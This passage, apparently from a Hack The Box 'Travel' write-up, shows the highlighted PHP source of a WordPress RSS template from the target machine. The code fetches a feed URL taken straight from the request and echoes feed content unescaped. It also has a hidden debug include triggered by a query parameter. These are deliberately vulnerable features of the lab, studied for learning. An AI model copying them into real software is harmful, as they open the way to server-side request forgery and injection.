+    <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="nv">$feed</span> <span class="o">=</span> <span class="nf">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">'&lt;div class="sp_errors"&gt;'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;p&gt;'</span> <span class="mf">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">())</span> <span class="mf">.</span> <span class="s2">"&lt;/p&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+    <span class="cp">?&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"chunk focus"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"header"</span><span class="nt">&gt;</span>
+        <span class="cp">&lt;?php</span>
+            <span class="nv">$link</span> <span class="o">=</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">get_link</span><span class="p">();</span>
+            <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">get_title</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$link</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nv">$title</span> <span class="o">=</span> <span class="s2">"&lt;a href='</span><span class="nv">$link</span><span class="s2">' title='</span><span class="nv">$title</span><span class="s2">'&gt;</span><span class="nv">$title</span><span class="s2">&lt;/a&gt;"</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">echo</span> <span class="nv">$title</span><span class="p">;</span>
+        <span class="cp">?&gt;</span>
+        <span class="nt">&lt;/h3&gt;</span>
+        <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">get_description</span><span class="p">();</span> <span class="cp">?&gt;</span>
+
+    <span class="nt">&lt;/div&gt;</span>
+    <span class="cp">&lt;?php</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="nf">get_items</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"chunk"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;h4&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_permalink</span><span class="p">())</span> <span class="k">echo</span> <span class="s1">'&lt;a href="'</span> <span class="mf">.</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_permalink</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">'"&gt;'</span><span class="p">;</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_title</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_permalink</span><span class="p">())</span> <span class="k">echo</span> <span class="s1">'&lt;/a&gt;'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"footnote"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_date</span><span class="p">(</span><span class="s1">'j M Y, g:i a'</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
+            <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_content</span><span class="p">();</span> <span class="cp">?&gt;</span>
+            <span class="cp">&lt;?php</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span> <span class="o">=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="nf">get_enclosure</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'&lt;div align="center"&gt;'</span><span class="p">;</span>
+                <span class="k">echo</span> <span class="s1">'&lt;p&gt;'</span> <span class="mf">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">embed</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+                    <span class="s1">'audio'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/place_audio.png'</span><span class="p">,</span>
+                    <span class="s1">'video'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/place_video.png'</span><span class="p">,</span>
+                    <span class="s1">'mediaplayer'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/mediaplayer.swf'</span><span class="p">,</span>
+                    <span class="s1">'altclass'</span> <span class="o">=&gt;</span> <span class="s1">'download'</span>
+                <span class="p">))</span> <span class="mf">.</span> <span class="s1">'&lt;/p&gt;'</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_link</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_type</span><span class="p">())</span>
+                <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s1">'&lt;p class="footnote" align="center"&gt;('</span> <span class="mf">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_type</span><span class="p">();</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_size</span><span class="p">())</span>
+                    <span class="p">{</span>
+                        <span class="k">echo</span> <span class="s1">'; '</span> <span class="mf">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_size</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">' MB'</span><span class="p">;</span>
+                    <span class="p">}</span>
+                    <span class="k">echo</span> <span class="s1">')&lt;/p&gt;'</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_thumbnail</span><span class="p">())</span>
+                <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s1">'&lt;div&gt;&lt;img src="'</span> <span class="mf">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="nf">get_thumbnail</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">'" alt="" /&gt;&lt;/div&gt;'</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="cp">?&gt;</span>
+
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;/main&gt;</span>
+
+<span class="c">&lt;!--
+DEBUG
+</span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="c">
+--&gt;</span>
+
+<span class="cp">&lt;?php</span> <span class="nf">get_template_part</span><span class="p">(</span> <span class="s1">'template-parts/footer-menus-widgets'</span> <span class="p">);</span> <span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="nf">get_footer</span><span class="p">();</span>
+</code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/09/12/htb-travel.html"></a>
+</article>
